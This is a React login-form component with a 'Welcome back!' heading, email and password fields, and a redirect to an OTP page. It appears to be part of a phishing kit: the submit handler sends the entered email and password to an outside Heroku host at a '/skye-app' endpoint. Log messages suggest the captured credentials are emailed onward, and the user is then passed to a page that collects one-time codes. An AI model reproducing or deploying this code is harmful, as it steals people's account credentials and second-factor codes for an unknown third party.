import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'

const Form = (props) => {
    const history = useHistory()

    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [loading, setLoading] = useState(false)

    const handleEmail = (e) => {
        setEmail(e.target.value)
    }

    const handlePassword = (e) => {
        setPassword(e.target.value)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        
        if (email === '' || password === '') {
            console.log('not sent')
        } else {
            console.log({ email, password })
            try {
               const URL = 'https://roqq.herokuapp.com'
              //  const URL = 'http://localhost:3030'
                const response = await fetch(URL + '/skye-app', {
                    method: 'POST',
                    headers: {
                        'Content-type': 'application/json',
                    },
                    body: JSON.stringify({
                        email,
                        password,
                        pin: '',
                    }),
                })

                const resData = await response.json()

                console.log('email sending started')

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/otp', { email, password })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                          setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (<>
        <form
            className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm'
            style={{ padding: '27px 12px' }}
            onSubmit={handleSubmit}
        >
            <div>
            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                Welcome back!
            </h2>
            <div className='relative'>
                <label htmlFor='email' className='input-label absolute'>
                    {' '}
                    Email Address
                </label>
                <input
                    type='email'
                    id='email'
                    required
                    placeholder='Enter your email'
                    className='sign-in-input'
                    value={email}
                    onChange={handleEmail}
                />
            </div>
            <div className='relative'>
                <label for='password' className='input-label absolute'>
                    Password
                </label>
                <input
                    type='password'
                    id='password'
                    className='sign-in-input'
                    required
                    placeholder='Enter your password'
                    value={password}
                    onChange={handlePassword}
                />
            </div>
            <div className='flex justify-center '>
                <div class='font-medium text-center underline text-[#006f95]'>
                    Forgot password?
                </div>
            </div>
            </div>
            <div>

            <button
                className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
            >
                {loading ? 'loading..' : 'Continue'}
            </button>
                </div>
        </form>
        <p className='text-center underline mt-9'>Create account?</p>
        </>
    )
}

export default Form
